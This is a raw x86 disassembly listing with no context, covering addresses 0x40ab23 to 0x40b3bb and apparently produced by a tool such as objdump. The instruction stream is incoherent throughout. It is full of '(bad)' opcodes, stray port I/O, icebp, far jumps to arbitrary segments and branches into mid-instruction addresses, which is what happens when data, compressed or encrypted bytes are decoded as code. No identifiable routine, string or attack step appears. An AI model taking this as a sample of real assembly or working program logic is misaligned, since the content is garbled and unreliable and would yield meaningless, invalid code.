  40ab23:	jne    0x40ab28
  40ab25:	loopne 0x40ab90
  40ab27:	sti    
  40ab28:	fsub   st(6),st
  40ab2a:	mov    eax,DWORD PTR [ebp+0x13]
  40ab2d:	pop    eax
  40ab2e:	push   DWORD PTR [ebp-0x31]
  40ab31:	fistp  QWORD PTR [edi]
  40ab33:	(bad)  
  40ab34:	cld    
  40ab35:	out    dx,al
  40ab36:	or     eax,eax
  40ab38:	int3   
  40ab39:	jae    0x40ab35
  40ab3b:	add    ah,bl
  40ab3d:	pop    es
  40ab3e:	push   DWORD PTR [ebp-0x21]
  40ab41:	in     eax,dx
  40ab42:	jae    0x40ab3c
  40ab44:	stos   DWORD PTR es:[edi],eax
  40ab45:	retf   0xff92
	...
  40ab58:	add    BYTE PTR [eax],al
  40ab5a:	pushf  
  40ab5b:	add    eax,eax
  40ab5d:	(bad)  
  40ab5f:	into   
  40ab60:	add    BYTE PTR [eax],al
  40ab62:	mov    ds:0x28ec437e,eax
  40ab67:	icebp  
  40ab68:	jle    0x40aba9
  40ab6a:	xchg   ebx,eax
  40ab6b:	cld    
  40ab6c:	or     ecx,0xffffffa1
  40ab6f:	pop    es
  40ab70:	add    BYTE PTR [edi-0x45],dl
  40ab73:	inc    ebx
  40ab74:	(bad)  
  40ab75:	call   FWORD PTR [edi+edi*2+0x43]
  40ab79:	rcr    BYTE PTR [ebx+eiz*2-0x30],1
  40ab7d:	push   0x412def
  40ab82:	jnp    0x40ab97
  40ab84:	pop    ebx
  40ab85:	add    BYTE PTR [ebx+0x57],dl
  40ab88:	push   DWORD PTR [ebp-0x7d]
  40ab8b:	pusha  
  40ab8c:	mov    al,ds:0xe809223f
  40ab91:	pop    ss
  40ab92:	call   0xdc90ab9f
  40ab97:	arpl   ax,dx
  40ab99:	push   0x412d77
  40ab9e:	cli    
  40ab9f:	inc    ebp
  40aba0:	or     ebx,DWORD PTR [ebx-0x6]
  40aba3:	fstp   QWORD PTR [ecx+ebx*2-0xf]
  40aba7:	sbb    eax,0xff10c70
  40abac:	jo     0x40abb6
  40abae:	add    DWORD PTR ds:0xdf8f8509,esp
  40abb4:	add    al,BYTE PTR [eax]
  40abb6:	icebp  
  40abb7:	xor    al,0x6f
  40abb9:	or     DWORD PTR ds:0xaea8,esi
	...
  40abcf:	add    dl,bh
  40abd1:	fild   DWORD PTR [edx]
  40abd3:	jmp    0x40abca
  40abd5:	sub    bh,BYTE PTR [edi]
  40abd7:	mov    ah,0xfa
  40abd9:	fild   DWORD PTR [edx]
  40abdb:	add    dh,bl
  40abdd:	scas   eax,DWORD PTR es:[edi]
  40abde:	ret    0xd5b8
  40abe1:	sti    
  40abe2:	idiv   esi
  40abe4:	enter  0x3c32,0x7
  40abe8:	dec    edi
  40abe9:	fdivr  QWORD PTR [edi+0x2dcd244]
  40abef:	add    dl,bh
  40abf1:	pop    ebx
  40abf2:	cmp    BYTE PTR [eax],al
  40abf4:	std    
  40abf5:	addr16 dec esp
  40abf7:	add    bh,dl
  40abf9:	fisttp DWORD PTR [edi-0x18]
  40abfc:	mov    ebp,0x83fef7b2
  40ac01:	and    eax,ecx
  40ac03:	or     BYTE PTR [edi],0xc4
  40ac06:	add    dh,BYTE PTR [ebp-0x25]
  40ac09:	adc    ebx,DWORD PTR [eax-0x823c4d5]
  40ac0f:	je     0x40ac57
  40ac11:	test   BYTE PTR [ecx+0xbdbfa59],ch
  40ac17:	shl    ch,0x60
  40ac1a:	push   es
  40ac1b:	add    bh,dl
  40ac1d:	fstp   TBYTE PTR [edi+0x2dd6244]
  40ac23:	add    dl,bh
  40ac25:	test   BYTE PTR [ecx],al
  40ac27:	add    bh,dl
  40ac29:	add    al,0xe9
  40ac2b:	test   BYTE PTR [esi+0x56ee7dc],bh
  40ac31:	jl     0x40ac06
  40ac33:	fild   WORD PTR [eax]
	...
  40ac45:	add    BYTE PTR [eax+ecx*2],dh
  40ac48:	inc    ecx
  40ac49:	add    eax,0xeae904fa
  40ac4e:	addr16 add al,0xe9
  40ac51:	add    edi,DWORD PTR [ecx+0x70]
  40ac54:	inc    ecx
  40ac55:	add    eax,0x76600187
  40ac5a:	sbb    cl,dl
  40ac5c:	stos   DWORD PTR es:[edi],eax
  40ac5d:	jmp    0x40ac57
  40ac5f:	add    al,0xe9
  40ac61:	add    esp,ebx
  40ac63:	mov    ds:0x85fa03e7,eax
  40ac68:	mov    ebp,ebx
  40ac6a:	clc    
  40ac6b:	ja     0x40ac63
  40ac6d:	mov    bl,BYTE PTR [esi-0x2f]
  40ac70:	and    eax,0xe908e23e
  40ac75:	add    edi,edx
  40ac77:	fistp  DWORD PTR [edx+eax*1-0x6]
  40ac7b:	add    al,0x6a
  40ac7d:	jns    0x40ac51
  40ac7f:	or     BYTE PTR [edi+eax*1-0x7d],dl
  40ac83:	outs   dx,DWORD PTR ds:[esi]
  40ac84:	mov    cl,0xbf
  40ac86:	ss fucom st(3)
  40ac89:	add    edi,edx
  40ac8b:	add    al,0xd0
  40ac8d:	outs   dx,DWORD PTR ds:[esi]
  40ac8e:	sti    
  40ac8f:	add    al,0xe9
  40ac91:	adc    BYTE PTR [esi],0xdd
  40ac94:	jmp    0x40ac9c
  40ac96:	ja     0x40acfc
  40ac98:	call   0x23bca6a0
  40ac9d:	sar    BYTE PTR [eax+0x6f],1
  40aca0:	push   ebp
  40aca1:	add    al,0xee
  40aca3:	sti    
  40aca4:	lods   eax,DWORD PTR ds:[esi]
  40aca5:	inc    ecx
  40aca6:	bound  eax,QWORD PTR [esi]
  40aca8:	jmp    0x40acb0
	...
  40acb9:	add    BYTE PTR [eax],al
  40acbb:	add    dl,bh
  40acbd:	fucomp st(5)
  40acbf:	mov    esi,0x3e6dcb6
  40acc4:	cli    
  40acc5:	add    al,0x0
  40acc7:	scas   al,BYTE PTR es:[edi]
  40acc8:	mov    ebx,0xf9e8ffc4
  40accd:	add    al,0xc7
  40accf:	lods   al,BYTE PTR ds:[esi]
  40acd0:	xor    ecx,esi
  40acd2:	(bad)  
  40acd3:	jmp    0x2d8576d1
  40acd8:	test   BYTE PTR [eax+eax*1],0xe9
  40acdc:	fs dec eax
  40acde:	mov    esp,0x4f9e9
  40ace3:	es mov ebx,0xf9e8ffac
  40ace9:	add    al,0xff
  40aceb:	mov    ah,0x25
  40aced:	jmp    0xf245d404
  40acf2:	mov    BYTE PTR [ecx+edi*4-0x21ca8b11],ah
  40acf9:	or     dh,bh
  40acfb:	push   cs
  40acfc:	in     eax,dx
  40acfd:	jge    0x40ad43
  40acff:	xor    ebp,esp
  40ad01:	jns    0x40acd7
  40ad03:	adc    ebx,edx
  40ad05:	icebp  
  40ad06:	(bad)  
  40ad07:	idiv   BYTE PTR [esi+0x49]
  40ad0a:	les    ebp,FWORD PTR [edx+0x3]
  40ad0d:	xor    eax,0x4f6283f
  40ad12:	jne    0x40ad4f
  40ad14:	adc    al,BYTE PTR es:[eax+0x28]
  40ad18:	neg    ah
  40ad1a:	or     al,0x30
  40ad1c:	inc    BYTE PTR [eax+edx*2]
  40ad1f:	push   ecx
	...
  40ad30:	add    BYTE PTR [eax],al
  40ad32:	add    eax,DWORD PTR [ebp+0x41]
  40ad35:	jmp    0xc20126c6
  40ad3a:	push   esp
  40ad3b:	dec    esi
  40ad3c:	add    cl,ch
  40ad3e:	lock les esi,FWORD PTR [ebx+0x1]
  40ad42:	push   cs
  40ad43:	sub    DWORD PTR [eax+0x28],eax
  40ad46:	(bad)  
  40ad47:	fdivr  st(0),st
  40ad49:	xor    esi,esi
  40ad4b:	add    al,0x50
  40ad4d:	add    DWORD PTR [edx],ebx
  40ad4f:	inc    ebp
  40ad50:	inc    ecx
  40ad51:	add    BYTE PTR [ebx-0x9],dl
  40ad54:	jae    0x40ad16
  40ad56:	imul   edx,DWORD PTR [ebx-0x49cffa8],0xffffffbf
  40ad5d:	je     0x40ace0
  40ad5f:	pop    esp
  40ad60:	sub    al,0x40
  40ad62:	xchg   edx,eax
  40ad63:	add    al,0xe8
  40ad65:	aad    0x3b
  40ad67:	add    al,0x0
  40ad69:	push   eax
  40ad6a:	cmp    ebp,DWORD PTR [eax]
  40ad6c:	inc    eax
  40ad6d:	inc    ecx
  40ad6e:	adc    esi,edi
  40ad70:	jae    0x40ad32
  40ad72:	retf   
  40ad73:	pop    esi
  40ad74:	pop    edx
  40ad75:	add    BYTE PTR [ebx],ah
  40ad77:	fist   DWORD PTR [esi]
  40ad79:	push   0x41440e
  40ad7e:	mov    ebx,0x130056aa
  40ad83:	push   esp
  40ad84:	push   0x48a335
  40ad89:	dec    DWORD PTR [esi-0x56a2193d]
  40ad8f:	add    eax,DWORD PTR [eax]
  40ad91:	or     edx,DWORD PTR [ebx]
  40ad93:	jne    0x40adf7
  40ad95:	inc    DWORD PTR [eax]
	...
  40ada7:	add    BYTE PTR [esi-0x44],cl
  40adaa:	out    0xa1,al
  40adac:	imul   eax,DWORD PTR [ebx],0x0
  40adaf:	push   eax
  40adb0:	aam    0x5f
  40adb2:	enter  0xe5e8,0xea
  40adb6:	std    
  40adb7:	jmp    FWORD PTR [edx]
  40adb9:	xor    BYTE PTR [edi+edi*8-0x72193ab2],bh
  40adc0:	jmp    0x40adca
  40adc2:	add    BYTE PTR [eax-0x4c],dl
  40adc5:	pop    edi
  40adc6:	(bad)  
  40adc7:	call   0x3e9b65
  40adcc:	sbb    dh,BYTE PTR [eax]
  40adce:	mov    eax,0xfec8d683
  40add3:	jae    0x40ad74
  40add5:	test   BYTE PTR [ebx-0x48],bh
  40add8:	arpl   WORD PTR [edi+0x2e],bx
  40addb:	push   0xef02ddfa
  40ade0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ade1:	jle    0x40ae51
  40ade3:	or     BYTE PTR [edx-0x68],dl
  40ade6:	cmp    dh,0x55
  40ade9:	outs   dx,BYTE PTR ds:[esi]
  40adea:	outs   dx,DWORD PTR ds:[esi]
  40adeb:	ror    BYTE PTR [ebp-0x10],0xa
  40adef:	call   0xff3617b2
  40adf4:	cmp    eax,0xaffeb6d0
  40adf9:	cmc    
  40adfa:	jmp    0xaffe:0xf5567638
  40ae01:	xchg   ebp,eax
  40ae02:	hlt    
  40ae03:	je     0x40adf7
  40ae05:	push   ebp
  40ae06:	test   BYTE PTR es:0x74f52e,dl
	...
  40ae1d:	add    BYTE PTR [edx],bh
  40ae1f:	inc    ebp
  40ae20:	cmp    DWORD PTR [edi+0x74f51e05],eax
  40ae26:	xor    dl,BYTE PTR ds:0xff58731
  40ae2c:	cmc    
  40ae2d:	je     0x40ade5
  40ae2f:	add    al,0x29
  40ae31:	xchg   ebp,esp
  40ae33:	push   esp
  40ae35:	je     0x40add5
  40ae37:	adc    al,0x21
  40ae39:	xchg   ebp,edx
  40ae3b:	out    dx,eax
  40ae3c:	repz je 0x40add1
  40ae3f:	add    al,0x19
  40ae41:	xchg   ebp,eax
  40ae43:	(bad)  
  40ae45:	or     al,0x79
  40ae47:	imul   ebp,esp,0xbbe72f05
  40ae4d:	inc    esp
  40ae4e:	mov    ds:0xfa0002da,al
  40ae53:	pop    edx
  40ae54:	jbe    0x40ae3e
  40ae56:	cli    
  40ae57:	das    
  40ae58:	xor    al,0x68
  40ae5a:	jbe    0x40ae5c
  40ae5c:	inc    ebx
  40ae5d:	add    BYTE PTR [ebp+0x4de7c831],cl
  40ae63:	adc    al,0x4
  40ae65:	add    cl,dh
  40ae67:	add    al,0xa9
  40ae69:	outs   dx,BYTE PTR ds:[esi]
  40ae6a:	std    
  40ae6b:	lds    esp,FWORD PTR [ebx]
  40ae6d:	in     al,dx
  40ae6e:	cli    
  40ae6f:	add    al,0xe9
  40ae71:	add    edx,edx
  40ae73:	or     ebp,DWORD PTR [ecx]
  40ae75:	inc    ebx
  40ae76:	cli    
  40ae77:	in     eax,dx
  40ae78:	sti    
  40ae79:	(bad)  
  40ae7a:	pop    ebp
  40ae7b:	mov    fs,WORD PTR [eax]
  40ae7d:	add    al,0xfa
  40ae7f:	stc    
  40ae80:	test   al,0x6e
	...
  40ae92:	add    BYTE PTR [eax],al
  40ae94:	std    
  40ae95:	lds    esp,FWORD PTR [ebx]
  40ae97:	in     al,dx
  40ae98:	sti    
  40ae99:	add    al,0xe9
  40ae9b:	add    esi,DWORD PTR ds:0x3feb2d78
  40aea1:	xchg   DWORD PTR [ebp-0xc],edx
  40aea4:	and    DWORD PTR [edx],esi
  40aea6:	sub    DWORD PTR [edx-0xbba11e4],edi
  40aeac:	or     ebx,DWORD PTR [edi-0x78030300]
  40aeb2:	test   dh,dh
  40aeb4:	add    al,0xee
  40aeb6:	sub    eax,0x5cdd2a6e
  40aebb:	jge    0x40aeb1
  40aebd:	in     eax,dx
  40aebe:	sbb    eax,0x44dcde6e
  40aec3:	jge    0x40aea9
  40aec5:	in     eax,dx
  40aec6:	pop    ebx
  40aec7:	ds jmp 0xfded:0x81d11154
  40aecf:	jmp    0xbc24:0xf3f5ebfc
  40aed6:	sub    dl,BYTE PTR [ebx]
  40aed8:	cli    
  40aed9:	push   edi
  40aeda:	jb     0x40aebc
  40aedc:	jp     0x40aea6
  40aede:	xchg   esp,eax
  40aedf:	repnz lods al,BYTE PTR ds:[esi]
  40aee1:	in     eax,dx
  40aee2:	lods   eax,DWORD PTR ds:[esi]
  40aee3:	mov    DWORD PTR [ebp-0x12],ebp
  40aee6:	int    0xf3
  40aee8:	popf   
  40aee9:	in     eax,dx
  40aeea:	call   0xd5882ff2
  40aeef:	dec    BYTE PTR [ebp+0x78]
  40aef2:	add    ah,ch
  40aef4:	jns    0x40af2b
  40aef6:	add    BYTE PTR [eax+eax*1],dh
	...
  40af09:	add    bl,dh
  40af0b:	fcomi  st,st(4)
  40af0d:	call   0x153fb40b
  40af12:	adc    bl,ch
  40af14:	pop    ebp
  40af15:	js     0x40af80
  40af17:	out    dx,al
  40af18:	or     ch,BYTE PTR [ecx+0x4867fde3]
  40af1e:	sbb    al,BYTE PTR [eax+eax*1+0x7e]
  40af22:	rcr    DWORD PTR [eax],cl
  40af24:	call   0xff2f769b
  40af29:	cmp    bl,0x5c
  40af2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af2d:	adc    eax,0xd4ff04bf
  40af32:	add    eax,0x2960ebdd
  40af37:	out    dx,al
  40af38:	mov    BYTE PTR [esi+ecx*2-0x11],ah
  40af3c:	inc    BYTE PTR [esi-0x4a]
  40af3f:	cs add ecx,ebp
  40af42:	stc    
  40af43:	jg     0x40aec9
  40af45:	sub    ecx,DWORD PTR [eax]
  40af47:	out    dx,al
  40af48:	(bad)  
  40af49:	cdq    
  40af4a:	and    DWORD PTR [ecx-0x7a],esp
  40af4d:	es jmp 0xe86c33cc
  40af53:	jmp    0x40af53
  40af55:	mov    ecx,0xfb7b1e8
  40af5a:	jmp    0x318a974a
  40af5f:	add    eax,0xb0837000
  40af64:	std    
  40af65:	test   al,0x2c
  40af68:	pcmpgtw mm4,QWORD PTR [ecx+0x5]
  40af6c:	add    cl,ch
	...
  40af7e:	add    BYTE PTR [eax],al
  40af80:	jp     0x40af13
  40af82:	rcr    edi,0xa8
  40af85:	jmp    0x40af7d
  40af87:	jmp    0x40af92
  40af89:	add    eax,0x80f8e900
  40af8e:	add    BYTE PTR [eax],0xa3
  40af91:	or     BYTE PTR [eax],al
  40af93:	(bad)  
  40af94:	loope  0x40afba
  40af96:	push   eax
  40af97:	push   0x410c2f
  40af9c:	mov    ebx,0x63005759
  40afa1:	jmp    0x40af61
  40afa3:	jne    0x40affb
  40afa5:	leave  
  40afa6:	inc    edi
  40afa7:	add    DWORD PTR [ebx+0x8],edx
  40afaa:	lea    edx,[ebp-0x2096f]
  40afb0:	into   
  40afb1:	inc    ecx
  40afb2:	sub    al,0x50
  40afb4:	jmp    0x40af4c
  40afb6:	sub    al,BYTE PTR [ecx+0x53]
  40afb9:	rcr    BYTE PTR [edx+0x57],1
  40afbc:	push   ebx
  40afbd:	or     BYTE PTR [ebx],cl
  40afbf:	rcl    BYTE PTR [esi-0x3],0xe8
  40afc3:	sub    al,0x22
  40afc5:	or     BYTE PTR [eax],al
  40afc7:	inc    DWORD PTR [esi+0x14]
  40afca:	call   0xfe375389
  40afcf:	or     esp,ebx
  40afd1:	ins    BYTE PTR es:[edi],dx
  40afd2:	punpckhbw mm2,QWORD PTR [ebx-0x33ffbef1]
  40afd9:	ins    BYTE PTR es:[edi],dx
  40afda:	adc    al,0xe8
  40afdc:	fs imul edi,esi,0x68ea08ff
	...
  40aff3:	add    BYTE PTR [eax],al
  40aff5:	add    BYTE PTR [ebp*2+0x6898e814],cl
  40affc:	(bad)  
  40affd:	(bad)  
  40affe:	ds (bad) 
  40b000:	sar    dh,0xfc
  40b003:	test   BYTE PTR [ebx+0x5051bf52],0xe8
  40b00a:	pop    esp
  40b00b:	imul   edi,esi,0xff5763ff
  40b011:	jne    0x40afc6
  40b013:	hlt    
  40b014:	jae    0x40b022
  40b016:	int3   
  40b017:	jae    0x40b021
  40b019:	call   0xff327f18
  40b01e:	popf   
  40b01f:	lds    ecx,FWORD PTR [eax-0x253d6a7c]
  40b025:	fdiv   st(2),st
  40b027:	fld    QWORD PTR [edx]
  40b029:	lea    edi,[eax]
  40b02b:	add    bh,BYTE PTR [ebx-0x7c]
  40b02e:	inc    esi
  40b02f:	fwait
  40b030:	lock (bad) 
  40b032:	loop   0x40b02e
  40b034:	xor    BYTE PTR [ecx-0x6],al
  40b037:	mov    dh,BYTE PTR [esi-0xf6d9b4d]
  40b03d:	out    0xf7,eax
  40b03f:	xor    eax,0x9e010004
  40b044:	ja     0x40b074
  40b046:	loop   0x40b075
  40b048:	sbb    al,0x41
  40b04a:	cli    
  40b04b:	jb     0x40b0c4
  40b04d:	adc    al,0x52
  40b04f:	jb     0x40b0cd
  40b051:	(bad)  
  40b052:	xor    eax,0x2cb3b762
  40b057:	dec    edx
  40b058:	icebp  
  40b059:	dec    edi
	...
  40b06a:	add    BYTE PTR [eax],al
  40b06c:	adc    dl,BYTE PTR [edx]
  40b06e:	jnp    0x40b06e
  40b070:	sbb    eax,0xea74efad
  40b075:	inc    edx
  40b076:	ja     0x40b084
  40b078:	stos   BYTE PTR es:[edi],al
  40b079:	sub    dh,BYTE PTR [edi+0x8]
  40b07c:	adc    dh,BYTE PTR [edx]
  40b07e:	in     al,dx
  40b07f:	(bad)  
  40b080:	std    
  40b081:	inc    esp
  40b082:	cmp    DWORD PTR [ebp-0x4b0edc0b],eax
  40b088:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b089:	or     dh,cl
  40b08b:	(bad)  
  40b08c:	ror    ah,cl
  40b08e:	pop    eax
  40b08f:	add    dl,bh
  40b091:	pop    esi
  40b092:	in     al,dx
  40b093:	add    DWORD PTR [eax-0x38],ecx
  40b096:	jnp    0x40b02c
  40b098:	xchg   dl,ch
  40b09a:	out    dx,eax
  40b09b:	(bad)  
  40b09c:	stc    
  40b09d:	or     eax,DWORD PTR [ebp-0x7e7e0717]
  40b0a3:	cmp    esp,esp
  40b0a5:	add    al,0x5a
  40b0a7:	ja     0x40b0a1
  40b0a9:	(bad)  [eax]
  40b0ab:	pop    esp
  40b0ac:	sub    al,0x2a
  40b0ae:	sub    BYTE PTR [ebx*4-0x6b0e6b50],al
  40b0b5:	jmp    0x53e9:0x52490d0
  40b0bc:	adc    al,BYTE PTR [edi-0x1605bd0b]
  40b0c2:	jae    0x40b07b
  40b0c4:	ja     0x40b0b0
  40b0c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0c7:	fstp   TBYTE PTR [edi+0x52]
  40b0ca:	jmp    0x669d7ad2
  40b0cf:	xor    BYTE PTR [eax],al
	...
  40b0e1:	add    BYTE PTR [ebx-0x764971fc],bh
  40b0e7:	jmp    0x40b06e
  40b0e9:	lock push ebp
  40b0eb:	push   0x4efa0416
  40b0f0:	adc    ch,bh
  40b0f2:	jge    0x40b164
  40b0f4:	loope  0x40b0f2
  40b0f6:	dec    ebx
  40b0f7:	jo     0x40b0e6
  40b0f9:	cld    
  40b0fa:	inc    edx
  40b0fb:	jno    0x40b10c
  40b0fd:	pop    esp
  40b0fe:	push   0x1d
  40b100:	test   al,0x3
  40b102:	sbb    eax,0x9edbf570
  40b107:	jl     0x40b14e
  40b109:	lock or al,0xb0
  40b10c:	je     0x40b0ff
  40b10e:	add    al,0xea
  40b110:	cwde   
  40b111:	fisttp DWORD PTR [esi+0x7d]
  40b114:	sub    eax,0x9bea45f0
  40b119:	adc    ebp,ebp
  40b11b:	outs   dx,DWORD PTR ds:[esi]
  40b11c:	in     eax,dx
  40b11d:	push   ebx
  40b11e:	in     eax,0x6f
  40b120:	loope  0x40b0fd
  40b122:	mov    ecx,0xddf00dee
  40b127:	lahf   
  40b128:	ins    BYTE PTR es:[edi],dx
  40b129:	lock int3 
  40b12b:	ja     0x40b190
  40b12d:	(bad)
  40b130:	push   ebp
  40b132:	sub    dl,ch
  40b134:	mov    ah,0x2d
  40b136:	stos   DWORD PTR es:[edi],eax
  40b137:	jmp    0xe900:0x5301d1fe
  40b13e:	jb     0x40b0e9
  40b140:	push   cs
  40b141:	ins    BYTE PTR es:[edi],dx
  40b142:	and    ch,bl
  40b144:	dec    dh
	...
  40b156:	add    BYTE PTR [eax],al
  40b158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b159:	mov    al,0xbb
  40b15b:	(bad)  
  40b15c:	popf   
  40b15d:	jmp    0xb600:0x52fefe7
  40b164:	inc    ebx
  40b165:	mov    cl,0xfd
  40b167:	scas   al,BYTE PTR es:[edi]
  40b168:	gs loope 0x40b1df
  40b16b:	ins    DWORD PTR es:[edi],dx
  40b16c:	pop    ebp
  40b16d:	jmp    0x6255:0x50eabc8
  40b174:	pop    edx
  40b175:	jmp    0x8610:0x7064dd74
  40b17c:	sar    eax,cl
  40b17e:	(bad)  
  40b17f:	hlt    
  40b180:	inc    ecx
  40b181:	loope  0x40b146
  40b183:	je     0x40b1d2
  40b185:	jmp    0x7255:0x4faabc8
  40b18c:	sbb    al,BYTE PTR [esi-0x1632a63d]
  40b192:	je     0x40b179
  40b194:	inc    ecx
  40b195:	pop    edi
  40b196:	mov    DWORD PTR [esi+0x25],ecx
  40b199:	(bad)  
  40b19a:	mov    edi,0xc94a02bc
  40b19f:	sub    edi,edx
  40b1a1:	add    al,0xff
  40b1a3:	mov    esp,0x6054dce9
  40b1a8:	in     eax,0xe7
  40b1aa:	or     ch,BYTE PTR [ecx]
  40b1ac:	jae    0x40b1b0
  40b1ae:	pop    edi
  40b1af:	xor    BYTE PTR [eax+0x6315fffc],bh
  40b1b5:	stc    
  40b1b6:	out    0xf0,eax
  40b1b8:	push   esp
  40b1b9:	out    0xfe,eax
	...
  40b1cb:	add    BYTE PTR [eax],al
  40b1cd:	add    al,cl
  40b1cf:	les    esi,FWORD PTR [ebx+0xf]
  40b1d2:	imul   esi,DWORD PTR [esi+eiz*1+0x73d7d341],0xc
  40b1da:	sti    
  40b1db:	scas   al,BYTE PTR es:[edi]
  40b1dc:	test   edi,edi
  40b1de:	xchg   esp,eax
  40b1df:	retf   
  40b1e0:	or     BYTE PTR [edx-0x6d],ch
  40b1e3:	xlat   BYTE PTR ds:[ebx]
  40b1e4:	jae    0x40b1f2
  40b1e6:	mov    ebx,0xc4ff858e
  40b1eb:	imul   eax,DWORD PTR [esp+esi*8+0x2b],0x93413f19
  40b1f3:	xlat   BYTE PTR ds:[ebx]
  40b1f4:	jae    0x40b1ea
  40b1f6:	mov    ebx,0xa4ff857e
  40b1fb:	imul   eax,DWORD PTR [eax+edi*8+0xb],0x5300fbcb
  40b203:	int3   
  40b204:	add    eax,DWORD PTR [esp+eax*4-0x78ba7829]
  40b20b:	dec    esp
  40b20c:	add    BYTE PTR [eax],dl
  40b20e:	arpl   WORD PTR [eax+ebp*8],ax
  40b211:	clc    
  40b212:	rcl    dh,1
  40b214:	std    
  40b215:	mov    DWORD PTR [esi],ecx
  40b217:	icebp  
  40b218:	std    
  40b219:	jne    0x40b1c6
  40b21b:	retf   
  40b21c:	test   al,0x88
  40b21e:	xchg   esp,eax
  40b21f:	(bad)  
  40b220:	or     eax,eax
  40b222:	adc    al,0x80
  40b224:	mov    ebx,0xff041300
  40b229:	jne    0x40b1d6
  40b22b:	dec    ebx
  40b22c:	call   0xff44d62e
  40b231:	jne    0x40b233
	...
  40b243:	add    bh,al
  40b245:	retf   
  40b246:	adc    BYTE PTR [ebp+0x13],0x4
  40b24a:	cmp    eax,0xffffffe1
  40b24d:	out    0x84,al
  40b24f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b250:	jecxz  0x40b255
  40b252:	add    BYTE PTR [ebx+0x3f7ed786],cl
  40b258:	cli    
  40b259:	(bad)  
  40b25b:	xor    DWORD PTR [edx-0x23],0x2
  40b25f:	add    BYTE PTR [edx-0x67],ah
  40b262:	sub    eax,0xda8efa41
  40b267:	cmp    DWORD PTR [esi+ebx*8],esp
  40b26a:	add    cl,BYTE PTR [ebx]
  40b26c:	mov    edx,0x27ff7671
  40b271:	out    0x5b,al
  40b273:	push   ebp
  40b275:	fld    QWORD PTR [edx]
  40b277:	jmp    DWORD PTR [edi]
  40b279:	into   
  40b27a:	pop    ebx
  40b27b:	mov    dl,0xe2
  40b27d:	sbb    al,0x4
  40b27f:	push   0x42ff32
  40b284:	sub    eax,0xfa5532d6
  40b289:	(bad)  
  40b28b:	mov    edi,0x74ed15ee
  40b290:	jb     0x40b2a5
  40b292:	add    ebp,DWORD PTR [eax-0x49]
  40b295:	mov    BYTE PTR [ecx+0x0],0xc5
  40b299:	test   DWORD PTR [esi],esi
  40b29b:	push   ebp
  40b29c:	cli    
  40b29d:	fnstsw WORD PTR [edi-0x9]
  40b2a0:	sti    
  40b2a1:	call   0x6e10b1db
  40b2a6:	in     eax,dx
  40b2a7:	je     0x40b2a9
	...
  40b2b9:	add    BYTE PTR [esi-0x7b],al
  40b2bc:	jmp    0x5496e846
  40b2c1:	mov    ecx,DWORD PTR [edx+0x52]
  40b2c4:	sti    
  40b2c5:	jg     0x40b2a7
  40b2c7:	div    BYTE PTR [esi+0x3]
  40b2ca:	xor    al,0xdb
  40b2cc:	dec    esi
  40b2cd:	inc    edx
  40b2ce:	add    DWORD PTR [eax+edi*2],ebp
  40b2d1:	add    eax,0x7504037a
  40b2d6:	adc    al,0x26
  40b2d8:	ja     0x40b2ea
  40b2da:	stos   BYTE PTR es:[edi],al
  40b2db:	cs ja  0x40b2e6
  40b2de:	loop   0x40b2ff
  40b2e0:	out    dx,al
  40b2e1:	(bad)  
  40b2e2:	in     eax,dx
  40b2e3:	add    eax,0xe6793111
  40b2e8:	sbb    eax,0x9be5efd9
  40b2ed:	adc    edx,ebp
  40b2ef:	jo     0x40b30a
  40b2f1:	in     eax,dx
  40b2f2:	inc    esi
  40b2f3:	std    
  40b2f4:	adc    BYTE PTR [edx-0x10021939],dh
  40b2fa:	or     ch,al
  40b2fc:	das    
  40b2fd:	in     eax,dx
  40b2fe:	mov    ah,0xe6
  40b300:	in     eax,dx
  40b301:	icebp  
  40b302:	pop    edi
  40b303:	sub    eax,0x5d7efcee
  40b308:	fsubp  st(4),st
  40b30a:	pushf  
  40b30b:	out    0x5b,al
  40b30d:	clc    
  40b30e:	popf   
  40b30f:	cld    
  40b310:	imul   ebp,esp,0xf43be68c
  40b316:	popf   
  40b317:	add    al,0x6a
  40b319:	in     al,dx
  40b31a:	jl     0x40b302
  40b31c:	cmp    ebp,esp
	...
  40b32e:	add    BYTE PTR [eax],al
  40b330:	pop    ebp
  40b331:	in     al,dx
  40b332:	push   0xffffffec
  40b334:	ins    BYTE PTR es:[edi],dx
  40b335:	out    0x1b,al
  40b337:	lock pop ebp
  40b339:	hlt    
  40b33a:	push   0xffffffec
  40b33c:	pop    esp
  40b33d:	out    0x1b,al
  40b33f:	adc    al,0x55
  40b341:	jo     0x40b320
  40b343:	in     al,dx
  40b344:	(bad)  
  40b345:	cld    
  40b346:	nop
  40b347:	jno    0x40b38d
  40b349:	out    0x7d,al
  40b34b:	dec    esp
  40b34c:	xor    eax,ebx
  40b34e:	in     al,0x3
  40b350:	iret   
  40b351:	jns    0x40b3cf
  40b353:	cmp    BYTE PTR [ecx],0xdd
  40b356:	gs jbe 0x40b367
  40b359:	out    0xd3,al
  40b35b:	adc    edx,DWORD PTR [edx]
  40b35d:	pop    esp
  40b35e:	mov    esp,0x28f9fa03
  40b363:	ja     0x40b30a
  40b365:	pop    edx
  40b366:	jmp    0xa8665ac6
  40b36b:	add    edi,ebp
  40b36d:	outs   dx,DWORD PTR ds:[esi]
  40b36e:	add    cl,bl
  40b370:	out    0x70,al
  40b372:	or     al,0x41
  40b374:	scas   al,BYTE PTR es:[edi]
  40b375:	cmp    dh,0x26
  40b378:	loop   0x40b31f
  40b37a:	jae    0x40b324
  40b37c:	dec    ecx
  40b37d:	push   ebp
  40b37e:	call   0xff28091f
  40b383:	loop   0x40b33e
  40b385:	jno    0x40b3b8
  40b387:	jo     0x40b3c5
  40b389:	(bad)  [ecx-0x1d]
  40b38c:	mov    eax,ds:0xa1f685d8
  40b391:	cli    
  40b392:	mov    edi,0x75
	...
  40b3a3:	add    BYTE PTR [eax],al
  40b3a5:	add    BYTE PTR [edx],al
  40b3a7:	out    0x74,al
  40b3a9:	add    DWORD PTR [esi-0x23],ecx
  40b3ac:	and    DWORD PTR [edi-0x6f],0xffffffe6
  40b3b0:	dec    edi
  40b3b1:	(bad)  
  40b3b2:	or     ebx,ebp
  40b3b4:	dec    edi
  40b3b5:	into   
  40b3b6:	or     edi,ebp
  40b3b8:	out    0x12,eax
  40b3ba:	nop
  40b3bb:	out    0xfe,al
